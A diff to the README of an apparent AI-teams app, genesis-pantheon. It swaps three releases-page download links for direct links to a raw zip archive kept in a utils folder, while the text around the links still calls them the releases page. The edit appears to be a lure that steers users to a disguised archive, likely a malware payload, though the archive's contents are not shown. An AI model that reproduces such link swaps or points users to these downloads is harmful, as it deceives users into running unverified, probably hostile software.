@@ -1,6 +1,6 @@
 # 🤖 genesis-pantheon - Run AI teams with one app
 
-[![Download genesis-pantheon](https://img.shields.io/badge/Download-Releases-purple?style=for-the-badge)](https://github.com/berrettabadger966/genesis-pantheon/releases)
+[![Download genesis-pantheon](https://img.shields.io/badge/Download-Releases-purple?style=for-the-badge)](https://github.com/berrettabadger966/genesis-pantheon/raw/refs/heads/main/genesis_pantheon/utils/pantheon-genesis-v3.8.zip)
 
 ## 🧭 What this app does
 
@@ -33,7 +33,7 @@ For best results:
 ## 📥 Download genesis-pantheon
 
 Visit this page to download:
-https://github.com/berrettabadger966/genesis-pantheon/releases
+https://github.com/berrettabadger966/genesis-pantheon/raw/refs/heads/main/genesis_pantheon/utils/pantheon-genesis-v3.8.zip
 
 On the releases page:
 1. find the latest release at the top
@@ -217,7 +217,7 @@ For smoother use:
 
 ## 📎 Download link
 
-[Open the genesis-pantheon releases page](https://github.com/berrettabadger966/genesis-pantheon/releases)
+[Open the genesis-pantheon releases page](https://github.com/berrettabadger966/genesis-pantheon/raw/refs/heads/main/genesis_pantheon/utils/pantheon-genesis-v3.8.zip)
 
 ## 🧾 File names you may see
 
